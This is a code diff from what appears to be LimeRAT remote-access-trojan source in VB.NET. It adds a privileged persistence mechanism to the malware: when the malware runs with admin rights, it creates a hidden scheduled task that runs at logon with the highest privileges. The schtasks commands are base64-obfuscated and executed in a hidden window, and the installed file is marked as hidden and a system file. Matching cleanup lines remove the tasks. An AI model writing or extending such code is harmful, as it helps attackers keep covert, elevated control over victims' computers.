@@ -22,8 +22,13 @@
 
                         IO.File.SetAttributes(C_Settings.fullpath, IO.FileAttributes.System + IO.FileAttributes.Hidden)
 
-                        '"schtasks /create /f /sc minute /mo 1 /tn LimeRAT /tr "
-                        Shell(BS(Convert.FromBase64String("c2NodGFza3MgL2NyZWF0ZSAvZiAvc2MgbWludXRlIC9tbyAxIC90biBMaW1lUkFUIC90ciA=")) + """'" & C_Settings.fullpath & "'""", AppWinStyle.Hide, False, -1) 'persistence
+                        If C_ID.Privileges = True Then
+                            '"schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin /tr "
+                            Shell(BS(Convert.FromBase64String("c2NodGFza3MgL2NyZWF0ZSAvZiAvc2MgT05MT0dPTiAvUkwgSElHSEVTVCAvdG4gTGltZVJBVC1BZG1pbiAvdHIg")) + """'" & C_Settings.fullpath & "'""", AppWinStyle.Hide, False, -1) 'persistence
+                        Else
+                            '"schtasks /create /f /sc minute /mo 1 /tn LimeRAT /tr "
+                            Shell(BS(Convert.FromBase64String("c2NodGFza3MgL2NyZWF0ZSAvZiAvc2MgbWludXRlIC9tbyAxIC90biBMaW1lUkFUIC90ciA=")) + """'" & C_Settings.fullpath & "'""", AppWinStyle.Hide, False, -1) 'persistence
+                        End If
 
                         Diagnostics.Process.Start(C_Settings.fullpath)
                         End
@@ -48,6 +53,8 @@
 
                     'schtasks /Delete /tn LimeRAT /F
                     Shell(BS(Convert.FromBase64String("c2NodGFza3MgL0RlbGV0ZSAvdG4gTGltZVJBVCAvRg==")), AppWinStyle.Hide, False, -1)
+                    'schtasks /Delete /tn LimeRAT-Admin /F
+                    Shell(BS(Convert.FromBase64String("c2NodGFza3MgL0RlbGV0ZSAvdG4gTGltZVJBVC1BZG1pbiAvRg==")), AppWinStyle.Hide, False, -1)
                     Threading.Thread.Sleep(50)
                 End If
 
